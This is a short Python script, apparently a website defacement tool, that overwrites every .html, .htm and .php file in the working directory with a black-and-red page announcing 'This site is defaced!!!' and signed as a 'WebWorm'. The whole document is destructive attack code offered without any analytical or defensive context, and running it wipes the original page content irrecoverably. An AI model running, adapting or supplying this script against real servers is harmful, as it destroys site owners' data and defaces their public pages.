import glob
from pathlib import Path
for i in glob.glob('*.*'):
    if Path(i).suffix == '.html' or Path(i).suffix == '.htm' or Path(i).suffix == '.php':
        with open(i, 'w') as f:
            f.write("""<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>This site is defaced!!!</TITLE>
</HEAD><BODY bgcolor="#000000" text="#FF0000">
<H1>This site is defaced!!!</H1>
<HR>
<ADDRESS><b>NeverEverNoSanity WebWorm generation 26.</b></ADDRESS>
</BODY></HTML>""")